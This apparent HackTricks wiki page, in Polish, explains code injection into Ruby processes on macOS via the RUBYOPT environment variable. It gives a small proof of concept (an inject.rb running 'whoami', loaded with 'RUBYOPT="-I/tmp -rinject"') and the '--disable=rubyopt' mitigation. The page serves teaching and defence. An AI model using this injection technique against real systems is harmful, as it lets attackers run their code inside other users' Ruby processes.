# Injection aplikacji Ruby w macOS

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby analizuje obsługiwane przełączniki wiersza poleceń ze zmiennej środowiskowej `RUBYOPT` przed uruchomieniem skryptu. Chociaż Ruby odrzuca niektóre przełączniki użyte w ten sposób, `-I` może dodać katalog wyszukiwania bibliotek, a `-r` może załadować bibliotekę. Proces uruchamiający Ruby ze zmiennymi środowiskowymi kontrolowanymi przez atakującego może więc zostać zmuszony do załadowania kodu Ruby kontrolowanego przez atakującego.<sup>[[1]](#references)</sup>

Utwórz `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Utwórz nieszkodliwy skrypt Ruby, taki jak `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Uruchom z kontrolowaną wartością `RUBYOPT`:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Aby wyłączyć to zachowanie, przekaż `--disable=rubyopt` (lub `--disable-rubyopt`) **przed** nazwą skryptu:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
Opcja zapisana po `hello.rb` jest przekazywana do skryptu w `ARGV`; nie wyłącza wcześniejszego przetwarzania `RUBYOPT` przez Ruby.<sup>[[1]](#references)</sup>

## References

- [1] [Dokumentacja Ruby - opcje wiersza poleceń Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
